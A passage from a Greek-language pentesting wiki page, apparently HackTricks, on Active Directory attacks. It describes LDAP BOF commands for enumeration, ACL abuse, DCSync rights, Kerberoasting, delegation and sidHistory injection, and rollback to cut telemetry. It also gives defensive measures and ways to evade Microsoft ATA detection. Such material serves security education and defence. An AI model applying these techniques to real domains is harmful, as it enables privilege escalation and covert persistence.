- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` αποκαλύπτουν roasting candidates, ρυθμίσεις delegation, και υπάρχοντες [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptors απευθείας από LDAP.
- `get-acl` and `get-writable --detailed` αναλύουν το DACL για να απαριθμήσουν trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes), και inheritance, παρέχοντας άμεσα targets για ACL privilege escalation.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives for escalation & persistence

- Οι Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) επιτρέπουν στον χειριστή να τοποθετήσει νέους principals ή machine accounts όπου υπάρχουν δικαιώματα OU. `add-groupmember`, `set-password`, `add-attribute`, και `set-attribute` καταλαμβάνουν άμεσα τους στόχους μόλις εντοπιστούν write-property rights.
- Εντολές επικεντρωμένες σε ACL όπως `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, και `add-dcsync` μεταφράζουν WriteDACL/WriteOwner σε οποιοδήποτε AD object σε password resets, έλεγχο group membership, ή DCSync replication privileges χωρίς να αφήνουν PowerShell/ADSI artifacts. Τα αντίστοιχα `remove-*` καθαρίζουν τα εισαγόμενα ACEs.

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` κάνουν έναν συμβιβασμένο χρήστη άμεσα Kerberoastable; `add-asreproastable` (UAC toggle) τον σημειώνει για AS-REP roasting χωρίς να πειράζει τον κωδικό.
- Τα delegation macros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) επαναγράφουν `msDS-AllowedToDelegateTo`, UAC flags, ή `msDS-AllowedToActOnBehalfOfOtherIdentity` από το beacon, επιτρέποντας constrained/unconstrained/RBCD attack paths και εξαφανίζοντας την ανάγκη για remote PowerShell ή RSAT.

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` εισάγει privileged SIDs στο SID history ενός ελεγχόμενου principal (see [SID-History Injection](sid-history-injection.md)), παρέχοντας stealthy access inheritance πλήρως μέσω LDAP/LDAPS.
- `move-object` αλλάζει το DN/OU των computers ή users, επιτρέποντας σε attacker να μεταφέρει assets σε OUs όπου υπάρχουν ήδη delegated rights πριν εκμεταλλευτεί `set-password`, `add-groupmember`, ή `add-spn`.
- Στενά στοχευμένες εντολές αφαίρεσης (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, κ.λπ.) επιτρέπουν γρήγορο rollback αφού ο χειριστής συγκομίσει credentials ή persistence, ελαχιστοποιώντας την τηλεμετρία.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Μερικές Γενικές Αμυνές

[**Μάθετε περισσότερα για το πώς να προστατεύετε credentials εδώ.**](../stealing-credentials/credentials-protections.md)

### **Αμυντικά Μέτρα για την Προστασία των Credentials**

- **Domain Admins Restrictions**: Συνιστάται οι Domain Admins να επιτρέπεται να συνδέονται μόνο σε Domain Controllers, αποφεύγοντας την χρήση τους σε άλλους hosts.
- **Service Account Privileges**: Services δεν πρέπει να τρέχουν με Domain Admin (DA) privileges για να διατηρείται η ασφάλεια.
- **Temporal Privilege Limitation**: Για εργασίες που απαιτούν DA privileges, η διάρκεια τους θα πρέπει να είναι περιορισμένη. Αυτό μπορεί να επιτευχθεί με: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Audit Event IDs 2889/3074/3075 και στη συνέχεια επιβάλετε LDAP signing plus LDAPS channel binding σε DCs/clients για να μπλοκάρετε LDAP MITM/relay προσπάθειες.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **Εφαρμογή Τεχνικών Deception**

- Η εφαρμογή deception περιλαμβάνει την τοποθέτηση παγίδων, όπως decoy users ή computers, με χαρακτηριστικά όπως passwords που δεν λήγουν ή είναι επισημασμένα ως Trusted for Delegation. Μια λεπτομερής προσέγγιση περιλαμβάνει τη δημιουργία χρηστών με συγκεκριμένα δικαιώματα ή την προσθήκη τους σε high privilege groups.
- Ένα πρακτικό παράδειγμα περιλαμβάνει τη χρήση εργαλείων όπως: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Περισσότερα για την ανάπτυξη deception techniques μπορείτε να βρείτε στο [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Αναγνώριση Deception**

- **Για User Objects**: Υποπτοί δείκτες περιλαμβάνουν μη τυπικό ObjectSID, σπάνιες συνδέσεις (logons), ημερομηνίες δημιουργίας και χαμηλούς αριθμούς bad password attempts.
- **Γενικοί Δείκτες**: Η σύγκριση attributes πιθανών decoy objects με εκείνα των γνήσιων μπορεί να αποκαλύψει ασυνέπειες. Εργαλεία όπως το [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) μπορούν να βοηθήσουν στην αναγνώριση τέτοιων deception.

### **Παρακάμπτοντας Συστήματα Ανίχνευσης**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Αποφυγή session enumeration σε Domain Controllers για να αποφευχθεί η ανίχνευση από ATA.
- **Ticket Impersonation**: Η χρήση **aes** keys για τη δημιουργία ticket βοηθάει στην αποφυγή ανίχνευσης αποφεύγοντας το downgrade σε NTLM.
- **DCSync Attacks**: Συνιστάται η εκτέλεση από μη-Domain Controller για την αποφυγή ανίχνευσης από ATA, καθώς η άμεση εκτέλεση από Domain Controller θα προκαλέσει ειδοποιήσεις.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
